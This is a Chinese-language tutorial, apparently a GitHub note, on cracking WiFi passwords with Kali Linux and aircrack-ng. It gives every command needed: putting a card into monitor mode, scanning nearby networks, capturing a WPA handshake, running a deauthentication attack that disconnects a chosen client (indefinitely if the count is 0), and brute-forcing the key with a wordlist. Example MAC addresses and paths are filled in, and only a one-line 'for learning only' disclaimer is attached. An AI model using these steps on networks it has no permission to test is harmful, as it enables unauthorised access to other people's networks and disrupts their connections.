# Kali使用抓包网卡破解wifi密码

- 查看当前的网卡信息
```
ifconfig
```
- 查看支持监听的网卡
```
airmon-ng
```
- 在启动网卡的监听模式之前一定要杀死进程，否则将会监听不到附近的WiFi，执行下面命令杀死进程
```
airmon-ng check kill
```
![09c87be609c764eb129e22dad68f66ff](https://github.com/user-attachments/assets/966e3eb0-d0d1-4628-83da-47876de9158d)  

- 激活无线网卡的监听模式
```
airmon-ng start wlan0
```
![b69c30b8f5a543c7e180178bfb936677](https://github.com/user-attachments/assets/6b701055-4251-4d4c-8fdb-b9e219e6cc67)  

- 扫描当前周边环境的WiFi信号
网卡型号和驱动不同命令也不同  
```
airodump-ng wlan0
```
或者
```
airodump-ng wlan0mon
```
开启网卡的监听模式之后，执行命令监听附近WIFI信息，监听到需要的信息之后ctrl+c停止  
![303c6e53dcc482d4a03f5c9b969e3e1c](https://github.com/user-attachments/assets/6ca731fa-15d1-4815-b45a-ba05eeef3497)  

- 根据自己的情况进行替换
  - 先启用抓包命令
  ```
  airodump-ng -c <ID> –bssid <目标路由器Mac地址> -w <保存的路径/文件名> wlan0
  ```
  示例：
  ```
  airodump-ng -c 11 –bssid 60:32:B1:56:3F:B2 -w /home/lingdu/桌面/handshake wlan0
  ```
  对上述参数的解释  
  <pre>
    1.-c:接的是上图中的CH，代表信道。
    2.--bssid:路由器的MAC地址。
    3.PWR:信号强度，数值越大代表信号越强。
    4.ENC：使用的加密方式。
    5.AUTH：代表认证方式。
    6.ESSID：代表WIFI名字。
    7.-w ~/wlan0mon:将抓取的流量包保存到根目录下并命名为wlan0mon。
  </pre>
  - ACK 死亡攻击：
  ```
  aireplay-ng -0 <攻击次数> -a <目标路由器Mac地址> -c <要攻击的目标Mac地址> wlan0
  ```
  示例
  ```
  aireplay-ng -0 10 -a 60:32:B1:56:3F:B2 -c F0:72:EA:E8:72:21 wlan0
  ```
  <pre>
    -0 表示发起默认的攻击，之后接的数字代表攻击次数，上图是攻击10次，如果想进行断网攻击就只用填写0，默认一直攻击。
    -a 指定的无线路由器的BSSID
    -c 指定断开连接的用户的MAC地址（上图中为STATION）
  </pre>

暴力破解命令：  
```
aircrack-ng -w <密码本文件路径/passwd.txt> -b <目标路由器Mac地址> <抓包文件路径/handshake-0*.cap>
```
示例：  
```
aircrack-ng -w /home/lingdu/桌面/password.txt -b 60:32:B1:56:3F:B2 /home/lingdu/桌面/handshake-0*.cap
```
善用技术，遵纪守法，此文仅供学习参考!!!
